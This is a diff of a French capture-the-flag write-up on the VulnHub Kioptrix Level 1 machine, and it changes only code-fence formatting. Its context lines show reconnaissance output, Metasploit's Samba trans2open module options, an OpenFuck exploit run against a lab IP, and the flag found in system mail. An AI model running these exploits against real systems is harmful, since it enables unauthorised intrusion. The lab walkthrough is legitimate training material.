@@ -14,7 +14,7 @@ Ici il s'agit [du tout premier](https://www.vulnhub.com/entry/kioptrix-level-1-1
 Let's go
 --------
 
-```plain
+```
 Nmap scan report for 192.168.1.104
 Host is up (0.00068s latency).
 Not shown: 994 closed ports
@@ -99,7 +99,7 @@ Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
 
 Un petit buster remonte quelques entrées intéressantes :  
 
-```plain
+```
 http://192.168.1.104/cgi-bin/ - HTTP 403 (0 bytes, plain)
 http://192.168.1.104/doc/ - HTTP 403 (0 bytes, plain)
 http://192.168.1.104/icons/ - HTTP 200 (0 bytes, plain)
@@ -114,7 +114,7 @@ En fait le contenu du site ne semble pas avoir de véritable intérêt si ce n'e
 
 On peut aussi utiliser le module *apache\_userdir\_enum* de *Metasploit* avec une liste de noms d' utilisateurs, ce qui nous permet de trouver certains utilisateurs du système :  
 
-```plain
+```
 [+] http://192.168.1.104/ - Users found: harold, john, operator, postgres, root, squid
 ```
 
@@ -125,7 +125,7 @@ Etant donné que le site Internet n'amène rien de probant, penchons nous sur le
 
 Metasploit a un exploit fiable pour ces vieilles versions de Samba :   
 
-```plain
+```
 msf exploit(trans2open) > show options         
 
 Module options (exploit/linux/samba/trans2open):
@@ -172,14 +172,14 @@ On trouve tout de même [un article de blog](https://paulsec.github.io/blog/2014
 
 Une fois cette étape passée, l'exploit a deux offsets correspondant à la distribution du challenge :  
 
-```plain
+```
         0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
         0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
 ```
 
 L'exploitation fonctionne sans problèmes :  
 
-```plain
+```
 $ ./OpenFuck 0x6b 192.168.1.104
 
 *******************************************************************
@@ -227,7 +227,7 @@ Flag
 
 Contrairement à d'habitude le flag ne se trouvait pas sous /root. Il fallait accéder aux mails du système pour le trouver :  
 
-```plain
+```
 $ ls /var/spool/mail -l
 total 1
 -rw-rw----    1 harold   harold          0 Sep 26  2009 harold
